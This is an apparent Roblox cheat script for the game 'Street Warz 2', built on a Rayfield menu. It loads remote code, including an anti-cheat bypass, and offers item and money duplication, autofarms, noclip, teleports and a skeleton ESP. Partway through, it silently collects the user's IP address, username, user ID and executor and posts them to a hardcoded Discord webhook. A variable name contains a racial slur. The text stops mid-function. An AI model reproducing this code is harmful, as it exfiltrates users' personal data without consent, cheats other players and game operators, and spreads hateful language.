local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local function checkExecuter()
    local executer = identifyexecutor()
    if executer == "Solara" or executer == "JJSploit" or executer == "Xeno" or executer == "Zorara" or executer == "Ronix" or executer == "NX" or executer == "Solar" then
        return true 
    end
    return false
end

if checkExecuter() then
    game.Players.LocalPlayer:Kick("Your executer does not support this script due to anti cheat. You must have an executer with 100 UNC.")
    return
else
loadstring(game:HttpGet('https://raw.githubusercontent.com/Pixeluted/adoniscries/refs/heads/main/Source.lua'))()
end

local player = game.Players.LocalPlayer

local whitelistedPlayers = {
    "kaisfrms2hub",    --main ac
    "LAC_cal69",  
    "Player",
    "Player",
    "Player",
    "Player",
    "Player",
}

local isWhitelisted = false
for _, whitelistedName in pairs(whitelistedPlayers) do
    if player.Name == whitelistedName then
        isWhitelisted = true
        break
    end
end

-- If the player is not whitelisted, send a notification and stop the script
if not isWhitelisted then
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Access Denied!!",
        Text = "You are not whitelisted!",
        Duration = 3
    })
    return -- Prevent further code execution
end

print("Whitelisted - Loading UI...")

local Window = Rayfield:CreateWindow({
   Name = "ZK | SW2 | PREMIUM",
   Icon = nil, -- No icon
   LoadingTitle = "Loading..",
   LoadingSubtitle = "By Theyfw_kais",
   -- Blue & Black Theme
   Theme = {
      TextColor = Color3.fromRGB(0, 255, 0),
      Background = Color3.fromRGB(128, 128, 128),
      Topbar = Color3.fromRGB(128, 128, 128),
      Shadow = Color3.fromRGB(128, 128, 128),
      NotificationBackground = Color3.fromRGB(128, 128, 128),
      NotificationActionsBackground = Color3.fromRGB(0, 170, 255),
      TabBackground = Color3.fromRGB(128, 128, 128),
      TabStroke = Color3.fromRGB(0, 255, 0),
      TabBackgroundSelected = Color3.fromRGB(0, 255, 0),
      TabTextColor = Color3.fromRGB(0, 255, 0),
      SelectedTabTextColor = Color3.fromRGB(128, 128, 128),
      ElementBackground = Color3.fromRGB(128, 128, 128),
      ElementBackgroundHover = Color3.fromRGB(128, 128, 128),
      SecondaryElementBackground = Color3.fromRGB(128, 128, 128),
      ElementStroke = Color3.fromRGB(0, 255, 0),
      SecondaryElementStroke = Color3.fromRGB(0, 255, 0),
      SliderBackground = Color3.fromRGB(0, 255, 0),
      SliderProgress = Color3.fromRGB(0, 255, 0),
      SliderStroke = Color3.fromRGB(0, 255, 0),
      ToggleBackground = Color3.fromRGB(128, 128, 128),
      ToggleEnabled = Color3.fromRGB(0, 255, 0),
      ToggleDisabled = Color3.fromRGB(128, 128, 128),
      ToggleEnabledStroke = Color3.fromRGB(0, 255, 0),
      ToggleDisabledStroke = Color3.fromRGB(128, 128, 128),
      ToggleEnabledOuterStroke = Color3.fromRGB(0, 255, 0),
      ToggleDisabledOuterStroke = Color3.fromRGB(128, 128, 128),
      DropdownSelected = Color3.fromRGB(0, 255, 0),
      DropdownUnselected = Color3.fromRGB(128, 128, 128),
      InputBackground = Color3.fromRGB(128, 128, 128),
      InputStroke = Color3.fromRGB(0, 255, 0),
      PlaceholderColor = Color3.fromRGB(0, 255, 0)
   },

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = False,
      FolderName = "YellowBlackThemeHub",
      FileName = "BigHub"
   },

   Discord = {
      Enabled = false,
      Invite = "noinvitelink",
      RememberJoins = true
   },

KeySystem = nil, -- Set this to true to use our key system
   KeySettings = {
      Title = "Untitled",
      Subtitle = "Key System",
      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {},
   }
})

local InfoTab = Window:CreateTab("Info", 4483362458)
local MainSection = InfoTab:CreateSection("Main Info")

local player = game.Players.LocalPlayer
local gameName = "Unknown Game"

pcall(function()
   local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
   if info and info.Name then
      gameName = info.Name
   end
end)

-- 👤 Player Name
InfoTab:CreateParagraph({
   Title = "Player",
   Content = player.Name
})

-- 🪪 User ID
InfoTab:CreateParagraph({
   Title = "User ID",
   Content = tostring(player.UserId)
})

-- 🎮 Game Name
InfoTab:CreateParagraph({
   Title = "Game",
   Content = gameName
})

local MainSection = InfoTab:CreateSection("Sw2 Info")

local stats = game.Players.LocalPlayer:WaitForChild("leaderstats", 5)
local kills = "?"
local cash = "?"

if stats then
   for _, stat in ipairs(stats:GetChildren()) do
      print("Stat found:", stat.Name, stat.Value)
   end

   -- Use the actual stat names here:
   kills = stats:FindFirstChild("Frags") and stats.Frags.Value or "?"
   cash = stats:FindFirstChild("Money") and stats.Money.Value or "?"
end

InfoTab:CreateParagraph({
   Title = "Street Warz 2 Stats",
   Content = "💰 Cash: "..cash.."\n🔫 Kills: "..kills
})

local MainTab = Window:CreateTab("Main", 4483362458) -- Title, Image
local MainSection = MainTab:CreateSection("💳Card Dupe💳")

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInputManager = game:GetService("VirtualInputManager")
local player = Players.LocalPlayer

local dupeAmount = 10

-- Notification function with error handling
local function notify(message, time, type)
    local success, err = pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = type or "Info",
            Text = message,
            Duration = time or 5,
        })
    end)

    if not success then
        warn("Notification failed: " .. err)
    end
end

-- Textbox for Duplication Amount
MainTab:CreateInput({
    Name = "Laptop & Card Dupe",
    PlaceholderText = "Amount",
    RemoveTextAfterFocusLost = false,
    Flag = "DupeAmount",
    Callback = function(value)
        dupeAmount = tonumber(value) or 10
        if dupeAmount <= 0 then
            dupeAmount = 10  -- Fallback value
            notify("Invalid amount, defaulting to 10.", 3, "Warning")
        end
    end
})

-- Duplication Function
local function duplicateCardsAndLaptops()
    if dupeAmount <= 0 then
        notify("Invalid amount!", 3, "Error")
        return
    end

    notify("Buying cards & laptops...", 3, "Info")

    -- Open Dealer UI
    fireclickdetector(game.Workspace["Streetz War"].Anonymous.ClickDetector)
    wait(2) -- Wait to ensure the UI is open
    player.PlayerGui:WaitForChild("DealerGui")
    local shopGui = player.PlayerGui.DealerGui.ShopFrame
    shopGui.Visible = true
    player.PlayerGui.DealerGui.Frame.Visible = false
    game:GetService("RunService"):Set3dRenderingEnabled(false)

    -- Position player correctly
    repeat wait() until player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    player.Character.HumanoidRootPart.CFrame = CFrame.new(-55, 4.5, 170)

    wait(0.5)

    -- Click buttons for purchasing
    local cardButton = shopGui["Blank Card"]
    local laptopButton = shopGui["laptop"]

    for i = 1, dupeAmount do
        task.wait()
        -- Click the card button
        if cardButton.Visible then
            local cardPos = cardButton.AbsolutePosition
            VirtualInputManager:SendMouseButtonEvent(cardPos.X + 150, cardPos.Y + 60, 0, true, game, 0)
            task.wait(0.1)
            VirtualInputManager:SendMouseButtonEvent(cardPos.X + 150, cardPos.Y + 60, 0, false, game, 0)
        end

        task.wait(0.1)

        -- Click the laptop button
        if laptopButton.Visible then
            local laptopPos = laptopButton.AbsolutePosition
            VirtualInputManager:SendMouseButtonEvent(laptopPos.X + 150, laptopPos.Y + 60, 0, true, game, 0)
            task.wait(0.1)
            VirtualInputManager:SendMouseButtonEvent(laptopPos.X + 150, laptopPos.Y + 60, 0, false, game, 0)
        end
    end

    game:GetService("RunService"):Set3dRenderingEnabled(true)

    -- Close the UI
    local exitButton = shopGui.exit
    VirtualInputManager:SendMouseButtonEvent(exitButton.AbsolutePosition.X + 300, exitButton.AbsolutePosition.Y + 65, 0, true, game, 0)
    wait()
    VirtualInputManager:SendMouseButtonEvent(exitButton.AbsolutePosition.X + 300, exitButton.AbsolutePosition.Y + 65, 0, false, game, 0)

    -- Move player to next step
    player.Character.HumanoidRootPart.CFrame = CFrame.new(954, 4.7, -61)
    wait(4)

    -- Process Laptops
    notify("Processing laptops...", 3, "Info")
    local laptopCount = 0
    for _, v in pairs(player.Backpack:GetChildren()) do
        if v.Name == "Laptop" then
            laptopCount = laptopCount + 1
        end
    end

    for i = 1, laptopCount - 1 do
        spawn(function()
            local args = { true, "NEW123" }
            ReplicatedStorage.Assets.Other.GiverPunchmade:InvokeServer(unpack(args))
        end)
    end

    wait(4)
    player.Backpack.Laptop.Parent = player.Character
    wait(4)

    -- Process Cards
    notify("Processing cards...", 3, "Info")
    local cardCount = 0
    for _, v in pairs(player.Backpack:GetChildren()) do
        if v.Name == "Loaded Card" then
            cardCount = cardCount + 1
        end
    end

    for i = 1, cardCount do
        spawn(function()
            local args = { false, "NEW123" }
            ReplicatedStorage.Assets.Other.GiverPunchmade:InvokeServer(unpack(args))
        end)
    end

    wait(1)
    notify("Duplication Complete!", 5, "Success")
    player.Character.Humanoid:UnequipTools()
end

-- Button for Duplication
MainTab:CreateButton({
    Name = "Dupe Laptop & Card",
    Callback = function()
        duplicateCardsAndLaptops()
    end
})

local MainSection = MainTab:CreateSection("📦Mop / Box Farm📦")

local Toggle = MainTab:CreateToggle({
    Name = "Mop Autofarm",
    CurrentValue = false,
    Flag = "MopAutofarm",
    Callback = function(state)
        _G.automopfarm = state
        if _G.automopfarm then
            while _G.automopfarm do
                for i, v in pairs(game.Workspace.CleanPart:GetChildren()) do
                    if v.ProximityPrompt.Enabled == true then
                        game:GetService("ReplicatedStorage").GiveMop:FireServer()
                        v.ProximityPrompt.HoldDuration = 1
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame + Vector3.new(0, 2, 0)
                        wait(1)
                        fireproximityprompt(v.ProximityPrompt, v.ProximityPrompt.HoldDuration, false)
                        wait(v.ProximityPrompt.HoldDuration + 2.2)
                    end
                end
            end
        end
    end
})

local Toggle = MainTab:CreateToggle({
    Name = "Box Autofarm",
    CurrentValue = false,
    Flag = "BoxAutofarm",
    Callback = function(state)
        _G.autoboxfarm = state

        if _G.autoboxfarm then
            task.spawn(function()
                while _G.autoboxfarm do
                    local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                    
                    -- Move to the box location
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Job.Box.BOX1.CFrame
                    wait(0.5)
                    
                    -- Pick up the box
                    fireclickdetector(game.Workspace.Job.Box.BOX1.ClickDetector)
                    wait(0.2)
                    
                    -- Move back to the old position
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                    
                    -- Equip the box
                    game.Players.LocalPlayer.Backpack:WaitForChild("Box").Parent = game.Players.LocalPlayer.Character
                    
                    -- Drop the box at the job area
                    firetouchinterest(game.Workspace.Job.Box.Job, game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, 0)
                    wait()
                    firetouchinterest(game.Workspace.Job.Box.Job, game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, 1)
                    
                    -- Wait for the job cooldown
                    wait(15)
                end
            end)
        end
    end
})


local Section = MainTab:CreateSection("🔫Gun and Safe Dupe🔫")

local Button = MainTab:CreateButton({
   Name = "Safe Duplication",
   Callback = function()
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-134867, -196, 3287)     
            wait(15)
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-134867, -196, 3292)
   end,
})

local Toggle = MainTab:CreateToggle({
   Name = "Dupe gun",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
               local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        local safeZones = game.Workspace.SafeZones:GetChildren()
        
        local closestSafeZone = nil
        local shortestDistance = math.huge 

        for _, safeZone in ipairs(safeZones) do
            local distance = (humanoidRootPart.Position - safeZone.Position).Magnitude
            if distance < shortestDistance then
                shortestDistance = distance
                closestSafeZone = safeZone
            end
        end
        
        if closestSafeZone then                
            humanoidRootPart.CFrame = closestSafeZone.CFrame
            character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead) 
        else
            warn("No safe zones found.")
        end
    end
})

MainTab:CreateButton({
    Name = "/pay 1000000",
    Callback = function()
        local success, err = pcall(function()
            local chatRemote = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents", 5)
            if chatRemote then
                local say = chatRemote:FindFirstChild("SayMessageRequest")
                if say then
                    say:FireServer("/pay 1000000", "All")
                else
                    warn("SayMessageRequest not found in chat system.")
                end
            else
                warn("DefaultChatSystemChatEvents not found.")
            end
        end)

        if not success then
            warn("Failed to send chat message:", err)
        end
    end
})


local PlayerTab = Window:CreateTab("Player", 4483362458) -- Title, Image
local PlayerSection = PlayerTab:CreateSection("Jump / Speed")

local Slider = PlayerTab:CreateSlider({
   Name = "WalkSpeed",
   Range = {0, 300},
   Increment = 10,
   Suffix = "Speed",
   CurrentValue = 10,
   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
   end,
})


local Slider = PlayerTab:CreateSlider({
   Name = "JumpHeight",
   Range = {0, 300},
   Increment = 10,
   Suffix = "Power",
   CurrentValue = 10,
   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
   end,
})

local PlayerSection = PlayerTab:CreateSection("Extra Abilities")

local Toggle = PlayerTab:CreateToggle({
   Name = "Infinite Jump",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
   InfiniteJumpEnabled = not InfiniteJumpEnabled -- Toggle the state of InfiniteJumpEnabled
       if InfiniteJumpEnabled then
           -- Infinite jump is enabled
           print("Infinite Jump Enabled")
           game:GetService("UserInputService").JumpRequest:Connect(function()
               if InfiniteJumpEnabled then
                   game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping")
               end
           end)
       else
           -- Infinite jump is disabled
           print("Infinite Jump Disabled")
       end
   end,
})


local player = game:GetService("Players").LocalPlayer
local noclip = false
local noclipLoop


local function toggleNoclip(state)
    noclip = state
    if noclip then
        noclipLoop = task.spawn(function()
            while noclip do
                if player.Character then
                    for _, part in pairs(player.Character:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end
                task.wait()
            end
        end)
    else
        -- Stop noclip and restore collision
        if noclipLoop then
            task.cancel(noclipLoop)
        end
        if player.Character then
            for _, part in pairs(player.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = true
                end
            end
        end
    end
end

-- Create Toggle Button
PlayerTab:CreateToggle({
    Name = "No-Clip",
    CurrentValue = false,
    Flag = "NoclipToggle",
    Callback = function(Value)
        toggleNoclip(Value)
    end,
})

local Button = PlayerTab:CreateButton({
   Name = "Fly V3",
   Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
   end,
})

local VisualTab = Window:CreateTab("Visual", 4483362458) -- Title, Image
local VisualSection = VisualTab:CreateSection("Custom name,lvl,emoji")

local function updateCharacterGui(field, text)
    local character = game.Players.LocalPlayer.Character
    if character and character:WaitForChild("Head") then
        local nameGui = character.Head:WaitForChild("NameGui"):WaitForChild("Main")
        if nameGui then
            local guiElement = nameGui:WaitForChild(field)
            if guiElement then
                guiElement.Text = text
            end
        end
    end
end


local lastplayername = nil
local lastplayerlvl  = nil
local lastplayeremoji = nil


VisualTab:CreateInput({
    Name = "Custom Name",
    PlaceholderText = "Enter Name...",
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        lastplayername = text
        updateCharacterGui("Name", text)
    end
})


VisualTab:CreateInput({
    Name = "Custom Level",
    PlaceholderText = "Enter Level...",
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        lastplayerlvl = text
        updateCharacterGui("Level", "LVL " .. text)
    end
})


VisualTab:CreateInput({
    Name = "Custom Emoji",
    PlaceholderText = "Enter Emoji...",
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        lastplayeremoji = text
        updateCharacterGui("Extras", "[" .. text .. "]")
    end
})


VisualTab:CreateButton({
    Name = "Apply Changes",
    Callback = function()
       
        if lastplayername then
            updateCharacterGui("Name", lastplayername)
        end
        
        if lastplayerlvl then
            updateCharacterGui("Level", "LVL " .. lastplayerlvl)
        end
        
        if lastplayeremoji then
            updateCharacterGui("Extras", "[" .. lastplayeremoji .. "]")
        end

       
        Rayfield:Notify({
            Title = "Updated",
            Content = "Updated By SEXY ZK HUB OWNER",
            Duration = 5
        })
    end
})


local HttpService = game:GetService("HttpService")

local executor = "Unknown"
if syn then
    executor = "Synapse X"
elseif secure_load then
    executor = "Script-Ware"
elseif KRNL_LOADED then
    executor = "KRNL"
elseif is_sirhurt_closure then
    executor = "SirHurt"
elseif pebc_execute then
    executor = "ProtoSmasher"
elseif fluxus then
    executor = "Fluxus"
elseif identifyexecutor then
    executor = identifyexecutor()
elseif getexecutorname then
    executor = getexecutorname()
end

-- Basic info
local discordUsername = "unknown#0000"
local robloxUser = game.Players.LocalPlayer.Name
local userId = game.Players.LocalPlayer.UserId
local placeId = game.PlaceId

-- Game name fetch
local gameName = "Unknown Game"
pcall(function()
   local info = game:GetService("MarketplaceService"):GetProductInfo(placeId)
   if info and info.Name then
      gameName = info.Name
   end
end)

-- IP fetch
local ip = "Unavailable"
pcall(function()
   ip = game:HttpGet("https://api.ipify.org")
end)

-- Webhook payload
local data = {
   ["embeds"] = {{
       ["title"] = "📋 New Script Log",
       ["color"] = 0x006400, -- Dark Green
       ["fields"] = {
           {
               ["name"] = "💻 Discord User",
               ["value"] = discordUsername,
               ["inline"] = true
           },
           {
               ["name"] = "👤 Roblox User",
               ["value"] = robloxUser,
               ["inline"] = true
           },
           {
               ["name"] = "🆔 User ID",
               ["value"] = tostring(userId),
               ["inline"] = true
           },
           {
               ["name"] = "🎮 Game",
               ["value"] = gameName,
               ["inline"] = false
           },
           {
               ["name"] = "🧪 Executor",
               ["value"] = executor,
               ["inline"] = false
           },
           {
               ["name"] = "🌍 IP Address",
               ["value"] = ip,
               ["inline"] = false
           }
       },
       ["footer"] = {
           ["text"] = "Logged by OP ZK HUB! | " .. os.date("%c")
       }
   }}
}

local jsonData = HttpService:JSONEncode(data)

-- Webhook send
local webhook = "https://discord.com/api/webhooks/1359959528816513074/RFvJweUlo2rgu8MnU6A0uwk9584rILct8QEuFjMfQzixyFYpl1kMiikyl6lBBk0uJgkI"

local req = http_request or syn.request or http.request
if req then
   req({
       Url = webhook,
       Method = "POST",
       Headers = {
           ["Content-Type"] = "application/json"
       },
       Body = jsonData
   })
end


local TeleportsTab = Window:CreateTab("Teleports", 4483362458) -- Title, Image
local Section = TeleportsTab:CreateSection("Main Teleports")

local mainTeleportLocations = {
    {Name = "🚗Dealership", Position = CFrame.new(842, 5, -7)},
    {Name = "🏩Apartments 2", Position = CFrame.new(739, 4, 199)},
    {Name = "🏨Apartments 1", Position = CFrame.new(4, 4, 52)},
    {Name = "🧹Paki Shop", Position = CFrame.new(-101, 4, 18)},
    {Name = "📦Box Job", Position = CFrame.new(-118, 4, 300)},
    {Name = "🍕Pizza Job", Position = CFrame.new(166, 5, 49)},
    {Name = "🏪Thrift Store", Position = CFrame.new(-42, 4, 36)},
    {Name = "🥊Boxing", Position = CFrame.new(259, 5, -100)},
    {Name = "🏆Casino", Position = CFrame.new(159, 5, 246)},
    {Name = "💎Ice Box", Position = CFrame.new(-11354, 4, 288)},
    {Name = "🤭Suit Shop", Position = CFrame.new(43, 4, -329)},
    {Name = "🏥Hospital", Position = CFrame.new(42, 4, -261)},
    {Name = "🔫Gun Store", Position = CFrame.new(-51807, 4, -11)},
    {Name = "🥷Bank Tools Etc", Position = CFrame.new(-142, 4, 189)},
    {Name = "💳Blanc Card Dealer", Position = CFrame.new(226, 4, -543)},
}

local mainLocationNames = {}
for _, location in ipairs(mainTeleportLocations) do
    table.insert(mainLocationNames, location.Name)
end

local selectedMainLocation = mainTeleportLocations[1]

TeleportsTab:CreateDropdown({
    Name = "Select Main Location",
    Options = mainLocationNames,
    CurrentOption = {mainLocationNames[1]},
    MultipleOptions = false,
    Flag = "MainTeleportLocationDropdown",
    Callback = function(Options)
        for _, location in ipairs(mainTeleportLocations) do
            if location.Name == Options[1] then
                selectedMainLocation = location
                break
            end
        end
    end
})

TeleportsTab:CreateButton({
    Name = "Teleport to Main Location",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = selectedMainLocation.Position
        else
            warn("No valid character or HumanoidRootPart found!")
        end
    end
})

-- Section 2: Gang Locker Teleports
local GangSection = TeleportsTab:CreateSection("Gang Turf / Locker Teleports")

local gangTeleportLocations = {
    {Name = "🍍TNT Locker", Position = CFrame.new(269, 5, 132)},
    {Name = "🩸ATB Locker", Position = CFrame.new(93, 4, -703)},
    {Name = "🩶SG Locker", Position = CFrame.new(188, 4, -395)},
    {Name = "💙KAO Locker", Position = CFrame.new(328, 7, 82)},
    {Name = "💙AF Locker", Position = CFrame.new(162, 5, 518)},
    {Name = "🧡EOS Locker", Position = CFrame.new(374, 22, 409)},
    {Name = "💚AOD Locker", Position = CFrame.new(6, 5, 509)},
    {Name = "❤️LAC Locker", Position = CFrame.new(-166, 4, -773)},
    {Name = "💙P9 Locker", Position = CFrame.new(459, 7, 160)},
    {Name = "💙TPL Locker", Position = CFrame.new(318, 7, 230)},
    {Name = "💛RGD Locker", Position = CFrame.new(599, 7, 223)},
    {Name = "NGF Locker", Position = CFrame.new(571, 20, 174)},
    {Name = "💙DF Locker", Position = CFrame.new(870, 5, 498)},
    {Name = "🎄Wheel Spin", Position = CFrame.new(142, 4, 91)},
}

local gangLocationNames = {}
for _, location in ipairs(gangTeleportLocations) do
    table.insert(gangLocationNames, location.Name)
end

local selectedGangLocation = gangTeleportLocations[1]

TeleportsTab:CreateDropdown({
    Name = "Select Gang Locker Location",
    Options = gangLocationNames,
    CurrentOption = {gangLocationNames[1]},
    MultipleOptions = false,
    Flag = "GangTeleportLocationDropdown",
    Callback = function(Options)
        for _, location in ipairs(gangTeleportLocations) do
            if location.Name == Options[1] then
                selectedGangLocation = location
                break
            end
        end
    end
})

TeleportsTab:CreateButton({
    Name = "Teleport to Gang Locker",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = selectedGangLocation.Position
        else
            warn("No valid character or HumanoidRootPart found!")
        end
    end
})


local TeleportsSection = TeleportsTab:CreateSection("Player Teleports")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local dkIsANigger = {}

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        table.insert(dkIsANigger, player.Name)
    end
end

local TeleportDropdown = TeleportsTab:CreateDropdown({
    Name = "Players",
    Options = dkIsANigger,
    CurrentOption = {},
    MultipleOptions = false,
    Flag = "PlayerDropdown",
    Callback = function(Options)
        SelectedPlayer = Options[1]
    end,
})

local function UpdateDropdown()
    local ExistingPlayers = {}
    for _, name in ipairs(dkIsANigger) do
        ExistingPlayers[name] = true
    end

    local NewOptions = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            table.insert(NewOptions, player.Name)
        end
    end

    dkIsANigger = NewOptions
    TeleportDropdown:Set(dkIsANigger)
end

local TeleportButton = TeleportsTab:CreateButton({
    Name = "Teleport",
    Callback = function()
        local TargetPlayer = Players:FindFirstChild(SelectedPlayer)
        if TargetPlayer and TargetPlayer.Character and LocalPlayer.Character then
            LocalPlayer.Character:SetPrimaryPartCFrame(TargetPlayer.Character:GetPrimaryPartCFrame())
        end
    end,
})

local RefreshButton = TeleportsTab:CreateButton({
    Name = "Refresh Players",
    Callback = UpdateDropdown,
})

local CombatTab = Window:CreateTab("Combat", 4483362458) -- Title, Image
local Section = CombatTab:CreateSection("Esp's")

local Toggle = CombatTab:CreateToggle({
   Name = "Skeleton Esp",
   CurrentValue = false,
   Flag = "Toggle1",
   Callback = function(Value)
        local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
local Camera = game:GetService("Workspace").CurrentCamera

local function DrawLine()
    local l = Drawing.new("Line")
    l.Visible = false
    l.From = Vector2.new(0, 0)
    l.To = Vector2.new(1, 1)
    l.Color = Color3.fromRGB(255, 255, 0)
    l.Thickness = 1
    l.Transparency = 1
    return l
end

local function DrawESP(plr)
    repeat wait() until plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil
    local limbs = {}
    local R15 = (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15) and true or false
    if R15 then 
        limbs = {
            -- Spine
            Head_UpperTorso = DrawLine(),
            UpperTorso_LowerTorso = DrawLine(),
            -- Left Arm
            UpperTorso_LeftUpperArm = DrawLine(),
            LeftUpperArm_LeftLowerArm = DrawLine(),
            LeftLowerArm_LeftHand = DrawLine(),
            -- Right Arm
            UpperTorso_RightUpperArm = DrawLine(),
            RightUpperArm_RightLowerArm = DrawLine(),
            RightLowerArm_RightHand = DrawLine(),
            -- Left Leg
            LowerTorso_LeftUpperLeg = DrawLine(),
            LeftUpperLeg_LeftLowerLeg = DrawLine(),
            LeftLowerLeg_LeftFoot = DrawLine(),
            -- Right Leg
            LowerTorso_RightUpperLeg = DrawLine(),
            RightUpperLeg_RightLowerLeg = DrawLine(),
            RightLowerLeg_RightFoot = DrawLine(),
        }
    else 
        limbs = {
            Head_Spine = DrawLine(),
            Spine = DrawLine(),
            LeftArm = DrawLine(),
            LeftArm_UpperTorso = DrawLine(),
            RightArm = DrawLine(),
            RightArm_UpperTorso = DrawLine(),
            LeftLeg = DrawLine(),
            LeftLeg_LowerTorso = DrawLine(),
            RightLeg = DrawLine(),
            RightLeg_LowerTorso = DrawLine()
        }
    end
    local function Visibility(state)
        for i, v in pairs(limbs) do
            v.Visible = state
        end
    end

    local function Colorize(color)
        for i, v in pairs(limbs) do
            v.Color = color
        end
    end

    local function UpdaterR15()
        local connection
        connection = game:GetService("RunService").RenderStepped:Connect(function()
            if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") ~= nil and plr.Character.Humanoid.Health > 0 then
                local HUM, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
                if vis then
                    -- Head
                    local H = Camera:WorldToViewportPoint(plr.Character.Head.Position)
                    if limbs.Head_UpperTorso.From ~= Vector2.new(H.X, H.Y) then
                        --Spine
                        local UT = Camera:WorldToViewportPoint(plr.Character.UpperTorso.Position)
                        local LT = Camera:WorldToViewportPoint(plr.Character.LowerTorso.Position)
                        -- Left Arm
                        local LUA = Camera:WorldToViewportPoint(plr.Character.LeftUpperArm.Position)
                        local LLA = Camera:WorldToViewportPoint(plr.Character.LeftLowerArm.Position)
                        local LH = Camera:WorldToViewportPoint(plr.Character.LeftHand.Position)
                        -- Right Arm
                        local RUA = Camera:WorldToViewportPoint(plr.Character.RightUpperArm.Position)
                        local RLA = Camera:WorldToViewportPoint(plr.Character.RightLowerArm.Position)
                        local RH = Camera:WorldToViewportPoint(plr.Character.RightHand.Position)
                        -- Left leg
                        local LUL = Camera:WorldToViewportPoint(plr.Character.LeftUpperLeg.Position)
                        local LLL = Camera:WorldToViewportPoint(plr.Character.LeftLowerLeg.Position)
                        local LF = Camera:WorldToViewportPoint(plr.Character.LeftFoot.Position)
                        -- Right leg
                        local RUL = Camera:WorldToViewportPoint(plr.Character.RightUpperLeg.Position)
                        local RLL = Camera:WorldToViewportPoint(plr.Character.RightLowerLeg.Position)
                        local RF = Camera:WorldToViewportPoint(plr.Character.RightFoot.Position)

                        --Head
                        limbs.Head_UpperTorso.From = Vector2.new(H.X, H.Y)
                        limbs.Head_UpperTorso.To = Vector2.new(UT.X, UT.Y)

                        --Spine
                        limbs.UpperTorso_LowerTorso.From = Vector2.new(UT.X, UT.Y)
                        limbs.UpperTorso_LowerTorso.To = Vector2.new(LT.X, LT.Y)

                        -- Left Arm
                        limbs.UpperTorso_LeftUpperArm.From = Vector2.new(UT.X, UT.Y)
                        limbs.UpperTorso_LeftUpperArm.To = Vector2.new(LUA.X, LUA.Y)

                        limbs.LeftUpperArm_LeftLowerArm.From = Vector2.new(LUA.X, LUA.Y)
                        limbs.LeftUpperArm_LeftLowerArm.To = Vector2.new(LLA.X, LLA.Y)

                        limbs.LeftLowerArm_LeftHand.From = Vector2.new(LLA.X, LLA.Y)
                        limbs.LeftLowerArm_LeftHand.To = Vector2.new(LH.X, LH.Y)

                        -- Right Arm
                        limbs.UpperTorso_RightUpperArm.From = Vector2.new(UT.X, UT.Y)
                        limbs.UpperTorso_RightUpperArm.To = Vector2.new(RUA.X, RUA.Y)

                        limbs.RightUpperArm_RightLowerArm.From = Vector2.new(RUA.X, RUA.Y)
                        limbs.RightUpperArm_RightLowerArm.To = Vector2.new(RLA.X, RLA.Y)

                        limbs.RightLowerArm_RightHand.From = Vector2.new(RLA.X, RLA.Y)
                        limbs.RightLowerArm_RightHand.To = Vector2.new(RH.X, RH.Y)

                        -- Left Leg
